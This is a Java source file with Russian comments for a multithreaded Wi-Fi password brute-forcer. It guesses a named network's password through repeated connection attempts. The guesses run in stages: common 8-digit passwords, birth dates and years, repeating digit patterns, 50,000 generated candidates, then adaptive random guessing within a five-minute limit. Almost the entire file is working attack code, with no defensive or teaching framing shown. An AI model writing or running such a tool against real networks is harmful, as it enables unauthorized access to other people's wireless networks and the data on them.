package org.example;

import javax.swing.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;
import java.util.function.Consumer;
import java.security.SecureRandom;

public class PasswordBruteForcer {
    private WifiConnector wifiConnector;
    private Consumer<String> logger;
    private volatile boolean isRunning = false;
    private SwingWorker<Void, String> bruteForceWorker;
    private AtomicLong attemptsCounter = new AtomicLong(0);
    private AtomicLong foundPassword = new AtomicLong(-1);
    private long startTime;
    private static final int THREAD_COUNT = 50;
    private static final int TIME_LIMIT_SECONDS = 300; // 5 минут
    private ExecutorService executor;

    // Умные стратегии подбора
    private static final String[] TOP_PASSWORDS = generateTopPasswords();
    private static final String[] DATE_PASSWORDS = generateDatePasswords();
    private static final String[] PATTERN_PASSWORDS = generatePatternPasswords();
    private static final String[] SMART_PASSWORDS = generateSmartPasswords();

    public PasswordBruteForcer(WifiConnector wifiConnector, Consumer<String> logger) {
        this.wifiConnector = wifiConnector;
        this.logger = logger;
        this.executor = Executors.newFixedThreadPool(THREAD_COUNT);
    }

    public void startBruteForce(String ssid, boolean showPasswords, Consumer<String> callback) {
        isRunning = true;
        attemptsCounter.set(0);
        foundPassword.set(-1);
        startTime = System.currentTimeMillis();

        log("🚀 ЗАПУСК СУПЕР-ОПТИМИЗИРОВАННОГО ПОДБОРА!");
        log("📶 Сеть: " + ssid);
        log("🧵 Потоков: " + THREAD_COUNT);
        log("⏱️ Таймер: 5 минут");
        log("🎯 Стратегия: Умный приоритетный перебор");

        bruteForceWorker = new SwingWorker<>() {
            @Override
            protected Void doInBackground() {
                try {
                    // Таймер на 5 минут
                    startTimer();

                    // 1. Сначала проверяем ТОП пароли (30 секунд)
                    log("🔍 Этап 1: Проверка топ-паролей...");
                    if (checkPasswordList(ssid, TOP_PASSWORDS, "Топ-пароли", callback)) {
                        return null;
                    }

                    // 2. Проверяем даты (30 секунд)
                    if (isTimeUp()) return null;
                    log("🔍 Этап 2: Проверка дат...");
                    if (checkPasswordList(ssid, DATE_PASSWORDS, "Даты", callback)) {
                        return null;
                    }

                    // 3. Проверяем паттерны (30 секунд)
                    if (isTimeUp()) return null;
                    log("🔍 Этап 3: Проверка паттернов...");
                    if (checkPasswordList(ssid, PATTERN_PASSWORDS, "Паттерны", callback)) {
                        return null;
                    }

                    // 4. Умный перебор (2 минуты)
                    if (isTimeUp()) return null;
                    log("🔍 Этап 4: Умный перебор...");
                    if (checkPasswordList(ssid, SMART_PASSWORDS, "Умные комбинации", callback)) {
                        return null;
                    }

                    // 5. Адаптивный рандомный перебор (оставшееся время)
                    if (isTimeUp()) return null;
                    log("🔍 Этап 5: Адаптивный перебор...");
                    startAdaptiveBruteForce(ssid, callback);

                } catch (Exception e) {
                    log("⚠️ Ошибка: " + e.getMessage());
                }

                if (foundPassword.get() == -1 && isRunning) {
                    log("❌ Время вышло! Пароль не найден за 5 минут.");
                    callback.accept(null);
                }

                return null;
            }

            @Override
            protected void process(List<String> chunks) {
                for (String message : chunks) {
                    log(message);
                }
            }
        };

        bruteForceWorker.execute();
    }

    private void startTimer() {
        new Thread(() -> {
            try {
                for (int seconds = 1; seconds <= TIME_LIMIT_SECONDS && isRunning && foundPassword.get() == -1; seconds++) {
                    Thread.sleep(1000);

                    // Обновляем прогресс каждые 30 секунд
                    if (seconds % 30 == 0) {
                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                        long remaining = TIME_LIMIT_SECONDS - elapsed;
                        log("⏱️ Прошло: " + elapsed + "сек | Осталось: " + remaining + "сек | Попыток: " +
                                String.format("%,d", attemptsCounter.get()));
                    }

                    // Последние 30 секунд - обратный отсчет
                    if (seconds >= TIME_LIMIT_SECONDS - 30 && seconds % 10 == 0) {
                        log("⏰ Осталось: " + (TIME_LIMIT_SECONDS - seconds) + " секунд!");
                    }
                }

                if (foundPassword.get() == -1 && isRunning) {
                    log("⏰ ВРЕМЯ ВЫШЛО! Останавливаем поиск...");
                    stopBruteForce();
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    private boolean isTimeUp() {
        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
        return elapsed >= TIME_LIMIT_SECONDS || foundPassword.get() != -1 || !isRunning;
    }

    private boolean checkPasswordList(String ssid, String[] passwords, String stageName, Consumer<String> callback) {
        int chunkSize = Math.max(1, passwords.length / THREAD_COUNT);
        List<Future<Boolean>> futures = new ArrayList<>();

        long stageStartTime = System.currentTimeMillis();
        log("⚡ " + stageName + ": " + passwords.length + " паролей");

        for (int i = 0; i < THREAD_COUNT && !isTimeUp() && foundPassword.get() == -1; i++) {
            final int start = i * chunkSize;
            final int end = Math.min(start + chunkSize, passwords.length);
            if (start >= passwords.length) break;

            Future<Boolean> future = executor.submit(() -> {
                for (int j = start; j < end && !isTimeUp() && foundPassword.get() == -1; j++) {
                    String password = passwords[j];
                    attemptsCounter.incrementAndGet();

                    if (wifiConnector.testConnection(ssid, password)) {
                        foundPassword.set(Long.parseLong(password));
                        log("🎉 УСПЕХ! Найден пароль: " + password + " (этап: " + stageName + ")");
                        callback.accept(password);
                        return true;
                    }

                    // Ультра-быстрая проверка
                    if (j % 50 == 0 && !isTimeUp()) {
                        try { Thread.sleep(1); } catch (InterruptedException e) { break; }
                    }
                }
                return false;
            });
            futures.add(future);
        }

        // Ждем завершения с таймаутом
        for (Future<Boolean> future : futures) {
            if (isTimeUp()) break;
            try {
                if (future.get(15, TimeUnit.SECONDS)) {
                    return true;
                }
            } catch (Exception e) {
                // Продолжаем
            }
        }

        long stageTime = (System.currentTimeMillis() - stageStartTime) / 1000;
        log("✅ " + stageName + " завершен за " + stageTime + "сек");
        return false;
    }

    private void startAdaptiveBruteForce(String ssid, Consumer<String> callback) {
        SecureRandom random = new SecureRandom();
        Set<String> triedPasswords = Collections.synchronizedSet(new HashSet<>());

        List<Future<Boolean>> futures = new ArrayList<>();

        for (int i = 0; i < THREAD_COUNT && !isTimeUp() && foundPassword.get() == -1; i++) {
            Future<Boolean> future = executor.submit(() -> {
                while (!isTimeUp() && foundPassword.get() == -1) {
                    // Генерируем умные пароли с приоритетами
                    String password = generateSmartPassword(random, triedPasswords);
                    attemptsCounter.incrementAndGet();

                    if (wifiConnector.testConnection(ssid, password)) {
                        foundPassword.set(Long.parseLong(password));
                        log("🎉 УСПЕХ! Найден пароль: " + password + " (адаптивный поиск)");
                        callback.accept(password);
                        return true;
                    }

                    // Динамическая задержка в зависимости от оставшегося времени
                    try {
                        long elapsed = (System.currentTimeMillis() - startTime) / 1000;
                        long remaining = TIME_LIMIT_SECONDS - elapsed;
                        long delay = remaining > 60 ? 1 : 0; // В последнюю минуту - без задержки
                        Thread.sleep(delay);
                    } catch (InterruptedException e) {
                        break;
                    }
                }
                return false;
            });
            futures.add(future);
        }
    }

    private String generateSmartPassword(SecureRandom random, Set<String> triedPasswords) {
        String password;
        int strategy = random.nextInt(100);

        if (strategy < 40) {
            // Случайные числа в популярных диапазонах
            int range = random.nextInt(4);
            switch (range) {
                case 0: password = String.format("%08d", random.nextInt(2000000)); break;  // 0-2M
                case 1: password = String.format("%08d", 10000000 + random.nextInt(20000000)); break; // 10-30M
                case 2: password = String.format("%08d", 50000000 + random.nextInt(10000000)); break; // 50-60M
                default: password = String.format("%08d", random.nextInt(100000000)); break; // Полный диапазон
            }
        } else if (strategy < 70) {
            // Даты и годы
            int year = 1950 + random.nextInt(76); // 1950-2025
            if (random.nextBoolean()) {
                password = String.format("%04d%04d", year, year);
            } else {
                int month = 1 + random.nextInt(12);
                int day = 1 + random.nextInt(28);
                password = String.format("%02d%02d%04d", day, month, year);
            }
        } else {
            // Паттерны
            int a = random.nextInt(10);
            int b = random.nextInt(10);
            int c = random.nextInt(10);

            switch (random.nextInt(3)) {
                case 0: password = "" + a + b + a + b + a + b + a + b; break; // ABABABAB
                case 1: password = "" + a + a + b + b + a + a + b + b; break; // AABBAABB
                default: password = "" + a + b + c + a + b + c + a + b; break; // ABCABCAB
            }
        }

        // Гарантируем уникальность
        while (triedPasswords.contains(password)) {
            password = String.format("%08d", random.nextInt(100000000));
        }
        triedPasswords.add(password);

        return password;
    }

    // Генерация умных паролей
    private static String[] generateSmartPasswords() {
        Set<String> passwords = new LinkedHashSet<>();
        SecureRandom random = new SecureRandom();

        // Генерируем 50,000 умных комбинаций
        while (passwords.size() < 50000) {
            int strategy = random.nextInt(100);
            String password;

            if (strategy < 60) {
                // Популярные диапазоны
                int range = random.nextInt(3);
                switch (range) {
                    case 0: password = String.format("%08d", random.nextInt(5000000)); break;
                    case 1: password = String.format("%08d", 10000000 + random.nextInt(40000000)); break;
                    default: password = String.format("%08d", 80000000 + random.nextInt(20000000)); break;
                }
            } else if (strategy < 90) {
                // Даты
                int year = 1960 + random.nextInt(66);
                int month = 1 + random.nextInt(12);
                int day = 1 + random.nextInt(28);
                password = String.format("%02d%02d%04d", day, month, year);
            } else {
                // Паттерны
                int a = random.nextInt(10);
                int b = random.nextInt(10);
                password = "" + a + b + a + b + a + b + a + b;
            }

            passwords.add(password);
        }

        return passwords.toArray(new String[0]);
    }

    private static String[] generateTopPasswords() {
        Set<String> passwords = new LinkedHashSet<>();

        // Самые популярные пароли
        String[] mostCommon = {
                "12345678", "00000000", "11111111", "12341234", "12344321", "11112222",
                "11223344", "01234567", "87654321", "00001111", "12121212", "12312312",
                "10041004", "20002000", "20012001", "20022002", "20082008", "20102010",
                "20202020", "20212021", "01012000", "01011980", "01011990", "01012010"
        };

        for (String pwd : mostCommon) passwords.add(pwd);

        // Повторяющиеся цифры
        for (int i = 0; i <= 9; i++) {
            passwords.add(String.valueOf(i).repeat(8));
        }

        // Простые последовательности
        for (int start = 0; start <= 5; start++) {
            for (int step = 1; step <= 3; step++) {
                StringBuilder sb = new StringBuilder();
                for (int j = 0; j < 8; j++) {
                    sb.append((start + j * step) % 10);
                }
                passwords.add(sb.toString());
            }
        }

        return passwords.toArray(new String[0]);
    }

    private static String[] generateDatePasswords() {
        Set<String> passwords = new LinkedHashSet<>();

        // Годы
        for (int year = 1950; year <= 2025; year++) {
            passwords.add(String.format("%04d%04d", year, year));
            passwords.add(String.format("0101%04d", year));
            passwords.add(String.format("3112%04d", year));
        }

        // Популярные даты рождения
        int[] years = {1960, 1970, 1975, 1980, 1985, 1990, 1995, 2000, 2005, 2010, 2015, 2020};
        for (int year : years) {
            for (int month = 1; month <= 12; month++) {
                for (int day = 1; day <= 28; day += 3) { // Каждый 3-й день для скорости
                    passwords.add(String.format("%02d%02d%04d", day, month, year));
                }
            }
        }

        return passwords.toArray(new String[0]);
    }

    private static String[] generatePatternPasswords() {
        Set<String> passwords = new LinkedHashSet<>();

        // Паттерны
        for (int a = 0; a <= 9; a++) {
            for (int b = 0; b <= 9; b++) {
                if (a != b) {
                    passwords.add("" + a + b + a + b + a + b + a + b);
                    passwords.add("" + a + a + b + b + a + a + b + b);
                }
            }
        }

        return passwords.toArray(new String[0]);
    }

    public void stopBruteForce() {
        isRunning = false;
        if (executor != null) {
            executor.shutdownNow();
        }
        if (bruteForceWorker != null && !bruteForceWorker.isDone()) {
            bruteForceWorker.cancel(true);
        }

        long totalTime = (System.currentTimeMillis() - startTime) / 1000;
        log("⏹️ Остановлено. Попыток: " + attemptsCounter.get() + " за " + totalTime + " сек");
    }

    public boolean isRunning() {
        return isRunning;
    }

    private void log(String message) {
        if (logger != null) {
            logger.accept(message);
        }
    }
}